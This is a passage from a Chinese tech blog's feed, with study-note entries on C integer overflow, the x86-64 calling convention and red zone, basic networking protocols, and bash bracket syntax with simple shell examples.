    <categories>
      
      <category>Linux</category>
      
      <category>shell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言的整数溢出机制</title>
    <link href="/2023/12/12/C%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/12/12/C%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>总结C语言的整数溢出机制</p><span id="more"></span><h1 id="整数溢出机制的分类"><a href="#整数溢出机制的分类" class="headerlink" title="整数溢出机制的分类"></a>整数溢出机制的分类</h1><ol><li>无符号</li><li>有符号</li></ol><h1 id="无符号整数溢出处理机制"><a href="#无符号整数溢出处理机制" class="headerlink" title="无符号整数溢出处理机制"></a>无符号整数溢出处理机制</h1><p>在C标准中，这类整数溢出机制是得到了具体的定义的。公式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*<span class="hljs-keyword">sizeof</span>(type));<br><span class="hljs-comment">//如果某个数溢出，则将这个数以该公式作模运算。</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> x = <span class="hljs-number">258</span>;<br><br>则实际上表示为：<br>x % <span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)) = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><h1 id="有符号整数溢出机制"><a href="#有符号整数溢出机制" class="headerlink" title="有符号整数溢出机制"></a>有符号整数溢出机制</h1><p>这里溢出在标准中没有被定义，但是各个编译器的实现是差不多的：</p><p><strong>如果是正向溢出（就是大于可以表示的最大的整数）其被当成了一个负数，则-1然后取反，如果是反向溢出则取反然后+1</strong></p><p>当<code>x</code>比<code>2^type的位数</code>还要大时，只取低<code>2^type的位数</code>位，<code>2^type的位数</code>是类型的位数。如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> x = <span class="hljs-number">400</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,x);<br><span class="hljs-comment">//由于x是char类型，所以它只占8bit。2^8 = 256 ，所以只取低bbit。则400取第八位-&gt;10010000b(144)，然后在进行-1取反 结果为-112</span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://coolshell.cn/articles/11466.html">https://coolshell.cn/articles/11466.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>abi总结</title>
    <link href="/2023/12/12/abi%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/12/abi%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>总结x86-64架构中的abi接口</p><span id="more"></span><h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><p>叶子函数：如果一个函数不再调用其他函数，这样的函数被称为叶子函数。 在许多应用程序中，大约一半的函数调用是对叶子函数的调用。 叶子函数在所有平台上都可以得到非常高效的编译，因为他们不需要进行参数的保存和恢复。</p><p>叶子函数<strong>函数内部不分配栈空间，也不调用其它函数，也不存储非易失性寄存器，也不处理异常</strong> </p><p>非叶子函数：函数中调用了其他函数的函数。</p><p>red zone区域，这个区域是 <code>System V ABI</code> 的优化，允许函数临时使用其堆栈帧(rsp指针)下方的 128 个字节(红色区域始终是 RSP 下方的 128 字节。随着 RSP 的变化（通过 PUSH&#x2F;POP&#x2F;MOV 等），红区的位置也会发生变化。)，而无需调整堆栈指针。但是<code>ABI</code>明确指出 <code>rsp</code> 之外的区域被认为是不稳定且使用不安全的。操作系统、调试器或中断处理程序可能会覆盖该区域。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312311654858.png"></p><p>一个关于red zone的示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">utilfunc</span><span class="hljs-params">(<span class="hljs-type">long</span> a, <span class="hljs-type">long</span> b, <span class="hljs-type">long</span> c)</span><br>&#123;<br>    <span class="hljs-type">long</span> xx = a + <span class="hljs-number">2</span>;<br>    <span class="hljs-type">long</span> yy = b + <span class="hljs-number">3</span>;<br>    <span class="hljs-type">long</span> zz = c + <span class="hljs-number">4</span>;<br>    <span class="hljs-type">long</span> sum = xx + yy + zz;<br><br>    <span class="hljs-keyword">return</span> xx * yy * zz + sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是使用<code>gcc</code>编译它的结构，由于该函数是一个叶子函数，所以<code>gcc</code>不会使区去调动<code>sp</code>指针，而是将函数的变量都存储在red zone中。这就相当于进行了指令优化。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312311725584.png"></p><p>但是这种优化可能会带来巨大的隐患。CPU和异常处理程序覆盖<code>red zone</code>中的数据。但被中断的函数仍然需要这些数据。因此，当我们从异常处理程序返回时，该函数将不再正常工作。这可能会导致奇怪的错误，需要数周的时间才能调试。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312311736367.png"></p><p>所以我们一般都会禁用该优化方法。<code>-mno-red-zone</code>，<a href="https://stackoverflow.com/questions/25787408/why-cant-kernel-code-use-a-red-zone">为什么内核代码不可使用red zone</a>。</p><h2 id="这里不得不提到的是Windows-abi和AMD-abi的不同了，实际上在Windows中根本就没有red-zone这个优化。还有以下不同：-只是用了四个寄存器进行整数类型的对象的传递-rcx-rdx-r8-r9-。"><a href="#这里不得不提到的是Windows-abi和AMD-abi的不同了，实际上在Windows中根本就没有red-zone这个优化。还有以下不同：-只是用了四个寄存器进行整数类型的对象的传递-rcx-rdx-r8-r9-。" class="headerlink" title="这里不得不提到的是Windows abi和AMD abi的不同了，实际上在Windows中根本就没有red zone这个优化。还有以下不同：- 只是用了四个寄存器进行整数类型的对象的传递( rcx, rdx, r8, r9 )。"></a>这里不得不提到的是Windows abi和AMD abi的不同了，实际上在Windows中根本就没有red zone这个优化。还有以下不同：<br>- 只是用了四个寄存器进行整数类型的对象的传递( rcx, rdx, r8, r9 )。</h2><h1 id="数据表示"><a href="#数据表示" class="headerlink" title="数据表示"></a>数据表示</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312121816030.png"></p><p>由上表可知：</p><ul><li>所有类型的对齐值和其大小是一致的。</li><li>LP64表示64位系统，ILP32表示32位系统</li></ul><hr><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><ul><li>AMD64提供了16个通用寄存器，每个64位</li><li>8个浮点数寄存器，每个80位</li><li>16个SSE寄存器，每个128位</li></ul><hr><h1 id="数据分类"><a href="#数据分类" class="headerlink" title="数据分类"></a>数据分类</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312141354216.png"></p><iframe src='/myjs/pdfjs/web/viewer.html?file=pdf\abi.pdf' style='width:820px;height:800px'></iframe><p>这里还要区分一下 “Caller Save” 和 ”Callee Save” 寄存器，即寄存器的值是由”调用者保存“ 还是由 ”被调用者保存“。当产生函数调用时，子函数内通常也会使用到通用寄存器，那么这些寄存器中之前保存的调用者(父函数)的值就会被覆盖。为了避免数据覆盖而导致从子函数返回时寄存器中的数据不可恢复，CPU 体系结构中就规定了通用寄存器的保存方式。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312241617367.png"></p><p>上图中最右侧显示了是否被 被调用者保存 ：</p><h2 id="rbx-rsp-rbp-r12-r15-fs-x87-CW"><a href="#rbx-rsp-rbp-r12-r15-fs-x87-CW" class="headerlink" title="rbx rsp rbp r12-r15 fs x87 CW"></a><code>rbx</code> <code>rsp</code> <code>rbp</code> <code>r12-r15</code> <code>fs</code> <code>x87 CW</code></h2><h1 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h1><h2 id="整数参数传递"><a href="#整数参数传递" class="headerlink" title="整数参数传递"></a>整数参数传递</h2><p>只有前6个参数可以被存入寄存器，后面的整数参数都按照参数传递的反序入栈。<br>六个寄存器分别为：<br>rdi rsi rdx rcx r8 r9</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312241619160.png" alt="参数传递"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312141319832.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312141319861.png"></p><h1 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312182211993.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312182256777.png"><br>除此之外，我们还发现func()没有下移rsp开辟栈空间的操作，导致rbp和rsp的值是相同的，其实这是一项编译优化：根据AMD64 ABI文档的描述，rsp以下128字节的区域被称为red zone，这是一块被保留的内存，不会被信号或者中断所修改。于是，func()作为叶子函数就可以在不调整栈指针的情况下，使用这块内存保存临时数据。</p><p>在更极端的优化下，rbp作为栈基址其实也是可以省略的，编译器完全可以使用rsp来代替，从而减少指令数量。GCC编译时添加参数“-fomit-frame-pointer”即可。</p><h1 id="资料参考"><a href="#资料参考" class="headerlink" title="资料参考"></a>资料参考</h1><p><a href="http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html">http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html</a></p><p><a href="https://learn.microsoft.com/zh-cn/cpp/build/prolog-and-epilog?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/build/prolog-and-epilog?view=msvc-170</a></p><p>abi.pdf</p><p><a href="https://learn.microsoft.com/zh-cn/cpp/build/prolog-and-epilog?view=msvc-170">https://learn.microsoft.com/zh-cn/cpp/build/prolog-and-epilog?view=msvc-170</a></p><p><a href="https://zhuanlan.zhihu.com/p/27339191">https://zhuanlan.zhihu.com/p/27339191</a></p><p><a href="https://zhuanlan.zhihu.com/p/272135463">寄存器总结</a></p><p><a href="https://os.phil-opp.com/red-zone/">https://os.phil-opp.com/red-zone/</a></p><p><a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64#the-red-zone">https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64#the-red-zone</a></p><p><a href="https://devblogs.microsoft.com/oldnewthing/20190111-00/?p=100685">https://devblogs.microsoft.com/oldnewthing/20190111-00/?p=100685</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络</title>
    <link href="/2023/12/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E6%B9%96%E7%A7%91%E5%A4%A7/"/>
    <url>/2023/12/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E6%B9%96%E7%A7%91%E5%A4%A7/</url>
    
    <content type="html"><![CDATA[<p>计算机网络—B站湖科大视频</p><span id="more"></span><h1 id="网络协议栈-protocol-stack"><a href="#网络协议栈-protocol-stack" class="headerlink" title="网络协议栈 protocol stack"></a>网络协议栈 protocol stack</h1><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/add3ec7d-323f-4613-8f79-bd5b8535c1bb-15230552.jpg"></p><h2 id="5层网络协议"><a href="#5层网络协议" class="headerlink" title="5层网络协议"></a>5层网络协议</h2><p>应用层    HTTP协议（文档的请求传送） 、SMTP协议、FTP协议</p><h3 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h3><p>TCP只能点对点全双工通信;UDP支持一对一、一对多、多对一和多对多的交互通信。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/14890f01-11e4-4e77-aeb9-99b842e4f91e-15230552.jpg"></p><p>UDP是一个面向无连接的协议，数据传输前，源端和终端不建立连接，发送端尽可能快的将数据扔到网络上，接收端从消息队列中读取消息段。UDP协议中，任何一方建立socket后，都可以用sendto发送数据、用recvfrom接收数据，不必关心对方是否存在，是否发送了数据。</p><p>首先不可靠性体现在无连接上，通信都不需要建立连接，想发就发，这样的情况肯定不可靠。</p><p>并且收到什么数据就传递什么数据，并且也不会备份数据，发送数据也不会关心对方是否已经正确接收到数据了。</p><p>再者网络环境时好时坏，但是 UDP 因为没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。</p><p>UDP 服务器端不需要调用监听(listen)和接收(accept)客户端连接，而客户端也不需要连接服务器端(connect)。</p><p>TCP是面向连接的协议，在收发数据前必须和对方建立可靠的连接，建立连接的3次握手、断开连接的4次挥手，为数据传输打下可靠基础;</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/bde5b308-d18d-4376-a20a-b9b3a8513293-15230552.jpg"></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>网祭协议IP </p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>基本数据单位为帧</p><p>主要协议：以太网协议</p><p>网桥和交换机</p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，中继器（Repeater，也叫放大器）和集线器。</p><h2 id="7层ISO-OSI模型"><a href="#7层ISO-OSI模型" class="headerlink" title="7层ISO OSI模型"></a>7层ISO OSI模型</h2><p>应用层</p><p>表示层</p><p>会话层</p><p>运输层</p><p>网络层</p><p>数据链路层</p><p>物理层</p><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="传输层作用"><a href="#传输层作用" class="headerlink" title="传输层作用"></a>传输层作用</h2><p>运输层为应用进程之间提供端到端的逻辑通信（但网络层是为主机之间提供逻辑通信）</p><p>运输层还要对收到的报文进行差错检测。</p><p>运输层需要有两种不同的运输协议，即面向连接的 TCP 和无连接的 UDP</p><h2 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h2><p>TCP报文结构</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/c66cea3e-3056-4dab-b9aa-6ae5b3ac6079-15230552.jpg"></p><h2 id="传输协议"><a href="#传输协议" class="headerlink" title="传输协议"></a>传输协议</h2><h3 id="停止等待协议"><a href="#停止等待协议" class="headerlink" title="停止等待协议"></a>停止等待协议</h3><p><img src="https://api2.mubu.com/v3/document_image/93eada35-a22e-472e-bfad-252287cd16e3-15230552.jpg"></p><p>停止等待协议的优点是简单，但缺点是信道利用率太低。假定AB之间有一条直通的信道来传送分组。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/b5aead9b-0c5b-44f1-a660-bce3c8b2c37e-15230552.jpg"></p><p>这里的TD是A发送分组所需要的时间（显然TD &#x3D; 分组长度 &#x2F; 数据速率）再假定TA是B发送确认分组所需要的时间（A和B处理分组的时间都忽略不计）那么A在经过TD+RTT+TA时间后才能发送下一个分组，这里的RTT是往返时间，因为只有TD是采用来传输有用的数据（这个数据包括了分组首部，如果可以知道传输更精确的数据的时间，可以计算的更精确），所有信道利用率为</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/203e1367-161c-41d4-9086-8417ce6f5fe9-15230552.jpg"></p><h3 id="流水线传输"><a href="#流水线传输" class="headerlink" title="流水线传输"></a>流水线传输</h3><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/7958017e-f19a-4173-a9e5-c3c1bd2dde43-15230552.jpg"></p><p>分为：连续ARQ协议和滑动窗口协议</p><p>滑动窗口协议比较复杂，是TCP协议的精髓所在，在这里先给出ARQ协议最基本的概念，但不涉及到许多细节问题。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/86d7d372-2a93-4876-a890-b51cb43832f1-15230552.jpg"></p><p>接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了。</p><p>累积确认有的优点是：容易实现，即使确认丢失也不必重传。缺点是：不能向发送方反映出接收方已经正确收到的所有分组的信息。</p><h2 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h2><p>利用滑动窗口机制可以很方便地在 TCP 连接上实现流量控制。</p><p>A 向 B 发送数据。在连接建立时，�B 告诉 A：“我的接收窗口 rwnd &#x3D; 400（字节）”。看下TCP首部窗口字段的用处</p><h2 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h2><p>在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏——产生拥塞(congestion)</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/2f200085-794e-40ce-8364-b190fc637272-15230552.jpg"></p><h3 id="乘法减小（multiplicative-decrease）"><a href="#乘法减小（multiplicative-decrease）" class="headerlink" title="乘法减小（multiplicative decrease）"></a>乘法减小（multiplicative decrease）</h3><p>“乘法减小“是指不论在慢开始阶段还是拥塞避免阶段，只要出现一次超时（即出现一次网络拥塞），就把慢开始门限值 ssthresh 设置为当前的拥塞窗口值乘以 0.5。</p><p>当网络频繁出现拥塞时，ssthresh 值就下降得很快，以大大减少注入到网络中的分组数。</p><h3 id="加法增大（addictive-increase）"><a href="#加法增大（addictive-increase）" class="headerlink" title="加法增大（addictive increase）"></a>加法增大（addictive increase）</h3><p>“加法增大”是指执行拥塞避免算法后，在收到对所有报文段的确认后（即经过一个往返时间），就把拥塞窗口 cwnd增加一个 MSS 大小，使拥塞窗口缓慢增大，以防止网络过早出现拥塞。</p><p>快重传，块恢复</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/6c490d3f-fa80-477b-8120-95201f4c69ff-15230552.jpg"></p><p>TCP有限状态机</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/5e9137b4-ee14-491f-bbd4-107d763bea8e-15230552.jpg"></p><h1 id="网络层-1"><a href="#网络层-1" class="headerlink" title="网络层"></a>网络层</h1><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><h3 id="分类编址"><a href="#分类编址" class="headerlink" title="分类编址"></a>分类编址</h3><p>IP地址最初根据网络前缀使用的地址位数和主机使用的地址位数，分为几个不同种类或类别。A类、B类和C类用于普通网络，D类指定用于IP组播流量，而E类则留出供实验使用。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/e3b72321-8adf-4a2f-9f99-3430c36a4c6d-15230552.jpg"></p><h3 id="CIDR编址"><a href="#CIDR编址" class="headerlink" title="CIDR编址"></a>CIDR编址</h3><p>基本设置</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/020c2eec-c479-46ac-b754-b0649cb216ae-15230552.jpg"></p><p>细节计算</p><p><img src="https://api2.mubu.com/v3/document_image/61988dab-8929-43fe-badd-b87885249259-15230552.jpg"></p><h1 id="数据链路层-1"><a href="#数据链路层-1" class="headerlink" title="数据链路层"></a>数据链路层</h1><h2 id="差错检测与纠正"><a href="#差错检测与纠正" class="headerlink" title="差错检测与纠正"></a>差错检测与纠正</h2><h3 id="循环冗余校验-Circle-Redundancy-Check-多项式校验"><a href="#循环冗余校验-Circle-Redundancy-Check-多项式校验" class="headerlink" title="循环冗余校验 Circle Redundancy Check 多项式校验"></a>循环冗余校验 Circle Redundancy Check 多项式校验</h3><p>在标准的以太帧格式中，最后有4个字节长度的冗余位，用于存储CRC校验的值，这个冗余位又常称为帧检验序列FCS（Frame Check Sequence）</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/ef097f90-6670-40d8-a824-4e75f3b6059f-15230552.jpg"></p><p>生成多项式</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/b66061b9-30ec-44ab-aec3-b984d7ecbd2a-15230552.jpg"></p><p>下面以一个简单示例来展示CRC的计算过程：以g(x)为CRC-4&#x3D;X4+X+1为例，此时除数P&#x3D;10011。假设源数据M为10110011。在发送端将M左移4位，然后除以P。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/171f6d5b-3ad2-4c40-841a-5b4300d239c1-15230552.jpg"></p><p>计算得到的余数就是0100，也就是CRC校验码。将0100附加到原始数据帧10110011后，组成新帧101100110100发送给接收端。接收端接收到该帧后，会用该帧去除以上面选定的除数P，验证余数是否为0，如果为0，则表示数据在传输过程中没有出现差错。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/25594163-507e-4b66-9e4e-b3bcafa251a1-15230552.jpg"></p><h2 id="载波监听CSMA"><a href="#载波监听CSMA" class="headerlink" title="载波监听CSMA"></a>载波监听CSMA</h2><p>CSMA的基本思想是：要传输的站点首先听一听介质上是否有其他站点在传输(载波侦听)。 如果介质忙，那么必须等待；如果不忙，则传输。冲突之后需要后退并重传。主要有三种形式：1. 1-坚持CSMA   2. 非坚持CSMA  3. p-坚持CSMA.</p><h2 id="CSMA-CD带冲突检测的CSMA协议"><a href="#CSMA-CD带冲突检测的CSMA协议" class="headerlink" title="CSMA&#x2F;CD带冲突检测的CSMA协议"></a>CSMA&#x2F;CD带冲突检测的CSMA协议</h2><p>所谓带冲突检测的CSMA，就是CSMA&#x2F;CD。这也是实际中使用的协议。它的具体思想是：在发送之前先监听信道。如果介质空闲，则马上传输。如果介质正在忙，则一直监听到信道空闲，立刻传输。如果检测到冲突，那么立刻停止传输，等待一个随机的时间，之后再重复上面的步骤。</p><p>如何检测到冲突？测到冲突其实很简单。消息发送的过程中主机进行监听，如果发现信道上面的电平值和自己发送端的电平值不相同，那么它就认为自己发送的时候有别人进行发送，也就是说信道发生了冲突。如图下 哪个端检测到冲突，那个端就发送JAM信号，并且中断自己的信号发送。这样过一段时间其他的发送端都能检测到自己的信号被冲突了，于是都停止发送了。于是各自随机后退，等待一段时间后重启监听和发送的过程。</p><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/401533bb-411c-481e-b15a-5e96130c23d8-15230552.jpg"></p><h2 id="局域网MAC地址"><a href="#局域网MAC地址" class="headerlink" title="局域网MAC地址"></a>局域网MAC地址</h2><p><img src="https://gcore.jsdelivr.net/gh/mcxen/image@main/70fc14a9-c57f-4780-aebd-d9110c1eacb8-15230552.jpg"></p><p>无论是局域网，还是广域网中的计算机之间的通信，最终都表现为将数据包从某种形式的链路上的初始节点出发，从一个节点传递到另一个节点，最终传送到目的节点。数据包在这些节点之间的移动都是由ARP（Address Resolution Protocol：地址解析协议）负责将IP地址映射到MAC地址上来完成的。Mac地址可以解决IP盗用的安全问题，交换机里面就是根据Mac地址进行发送和接受数据的。</p><p>如果一个以太网卡坏了，可以被更换，而无须取得一个新的IP地址。如果一个IP主机从一个网络移到另一个网络，可以给它一个新的IP地址，而无须换一个新的网卡。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash中的()、(())、[]、[[]]、{}</title>
    <link href="/2023/12/10/bash%E4%B8%AD%E7%9A%84()%E3%80%81(())%E3%80%81%5B%5D%E3%80%81%5B%5B%5D%5D%E3%80%81%7B%7D/"/>
    <url>/2023/12/10/bash%E4%B8%AD%E7%9A%84()%E3%80%81(())%E3%80%81%5B%5D%E3%80%81%5B%5B%5D%5D%E3%80%81%7B%7D/</url>
    
    <content type="html"><![CDATA[<p>总结bash编程中的这些特殊符号</p><span id="more"></span><h1 id=""><a href="#" class="headerlink" title="()"></a>()</h1><p>单小括号在shell中的两个作用：</p><ul><li>初始化数组</li><li><code>$(commands)</code>启动一个新shell执行单个命令或者是多个命令</li></ul><h2 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arr=(1 2 3 4)<br></code></pre></td></tr></table></figure><h2 id="执行单个命令"><a href="#执行单个命令" class="headerlink" title="执行单个命令"></a>执行单个命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">x=$(<span class="hljs-built_in">ls</span> -al)<br><span class="hljs-comment">#等效于</span><br>x=<span class="hljs-string">&#x27;ls -al&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="执行多个命令"><a href="#执行多个命令" class="headerlink" title="执行多个命令"></a>执行多个命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$(<span class="hljs-built_in">cd</span> ./;<span class="hljs-built_in">ls</span> -al;)<br></code></pre></td></tr></table></figure><p>需要注意点：</p><ul><li>每个命令使用<code>;</code>分隔，最后一个命令可以使用<code>;</code>也可以不用</li></ul><hr><h1 id="-1"><a href="#-1" class="headerlink" title="(())"></a>(())</h1><p><strong>双小括号仅仅用于整数的处理</strong>，只要括号中的运算符、表达式符合C语言运算规则，都可用在$((exp))中，甚至是三目运算符。作不同进位(如二进制、八进制、十六进制)运算时，输出结果全都自动转化成了十进制。如：echo $((16#5f)) 结果为95 (16进位转十进制)</p><p>双括号中的变量可以不使用<code>$</code>符号前缀。括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则,比如可以直接使用<code>for((i=0;i&lt;5;i++))</code>, 如果不使用双括号, 则为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 0 4`<br></code></pre></td></tr></table></figure><p>或者<code>for i in &#123;0..4&#125;</code>。再如可以直接使用<code>if (($i&lt;5))</code>, 如果不使用双括号, 则为<code>if [ $i -lt 5 ]</code>。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312101714577.png"></p><hr><h1 id="-2"><a href="#-2" class="headerlink" title="[]"></a>[]</h1><p>bash 的内部命令，<code>[</code>和test是等同的。此运算符的作用有四个：</p><ul><li>文件比较</li><li>整数比较</li><li>字符串比较</li><li>逻辑比较</li></ul><h2 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312101706264.png"></p><h2 id="整数比较"><a href="#整数比较" class="headerlink" title="整数比较"></a>整数比较</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312101707019.png"></p><p>注意点：</p><ul><li>Test和[]中可用的比较运算符只有<code>==</code>和<code>!=</code>，两者都是用于字符串比较的，不可用于整数比较，整数比较只能使用<code>-eq</code>，<code>-gt</code>这种形式。<strong>无论是字符串比较还是整数比较都不支持大于号小于号</strong>。如果实在想用，对于字符串比较可以使用转义形式，如果比较”ab”和”bc”：<code>[ ab \&lt; bc ]</code>，但是无法转移<code>&gt;=</code> <code>&lt;=</code>。所以最好还是在<code>[]</code>中使用字母。</li><li>中间无法使用正则表达式</li></ul><h2 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312101710294.png"></p><p>注意点：</p><ul><li><code>[]</code>首尾必须有空格</li></ul><h2 id="逻辑比较"><a href="#逻辑比较" class="headerlink" title="逻辑比较"></a>逻辑比较</h2><p>[ ]中的逻辑与和逻辑或使用<code>-a</code>和<code>-o</code>表示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[ <span class="hljs-variable">$a</span> -e <span class="hljs-variable">$b</span> -a <span class="hljs-variable">$c</span> -eq <span class="hljs-variable">$b</span> ]<br><span class="hljs-comment">#或</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ne 1] &amp;&amp; [ <span class="hljs-variable">$a</span> != 2 ]  <br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312101738104.png"></p><p>注意点：</p><ul><li>上面不要：<code>[ ($a -e $b) 